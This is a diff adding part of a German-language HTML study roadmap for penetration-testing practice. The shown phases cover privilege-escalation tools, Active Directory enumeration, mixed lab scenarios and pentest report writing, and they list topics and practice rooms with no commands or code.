+              <li>WinPEAS, PowerUp, LinPEAS.</li>
+              <li>SUID, sudo, Dienstkonfigurationen.</li>
+              <li>Verstehen, wann ein lokaler Exploit sinnvoll ist.</li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </details>
+
+    <details>
+      <summary><span class="bullet"></span> Phase 4 – Active Directory Grundlagen</summary>
+      <div class="details-body">
+        <p>Ziel: AD-Strukturen erkennen, grundlegende Enumeration durchführen und einfache Pivot-Szenarien verstehen.</p>
+        <ul>
+          <li>Räume: Reset, Ledger, K2, AD: Authenticated Enumeration.</li>
+          <li>Schwerpunkte:
+            <ul>
+              <li>SharpHound/BloodHound-Grundlagen.</li>
+              <li>Erkennen von Domänenstrukturen.</li>
+              <li>Einfache Pivoting-Werkzeuge (z. B. Ligolo-ng) im Testumfeld üben.</li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </details>
+
+    <details>
+      <summary><span class="bullet"></span> Phase 5 – Mischszenarien (Netzwerk + Web + AD)</summary>
+      <div class="details-body">
+        <p>Ziel: Szenarien bearbeiten, in denen mehrere Themen kombiniert auftreten.</p>
+        <ul>
+          <li>Räume: Lookback, Net Sec Challenge, weitere kombinierte Maschinen.</li>
+          <li>Schwerpunkte:
+            <ul>
+              <li>Kombination von Recon, Web, Credentials und PrivEsc.</li>
+              <li>Konsistentes Arbeiten mit einer festen Methodik.</li>
+              <li>Notizen erstellen, als Grundlage für Berichte.</li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </details>
+
+    <details>
+      <summary><span class="bullet"></span> Phase 6 – Reporting</summary>
+      <div class="details-body">
+        <p>Ziel: Befunde klar und strukturiert dokumentieren, mit Fokus auf Nachvollziehbarkeit und fachliche Relevanz.</p>
+        <ul>
+          <li>Räume: Writing Pentest Reports.</li>
+          <li>Schwerpunkte:
+            <ul>
+              <li>Berichte mit klarer Struktur erstellen.</li>
+              <li>Technische Details mit fachlicher Auswirkung verbinden.</li>
+              <li>Reproduzierbare Schritte, keine unklaren Beschreibungen.</li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </details>
+  </div>
+</div>
+</body>
+</html>
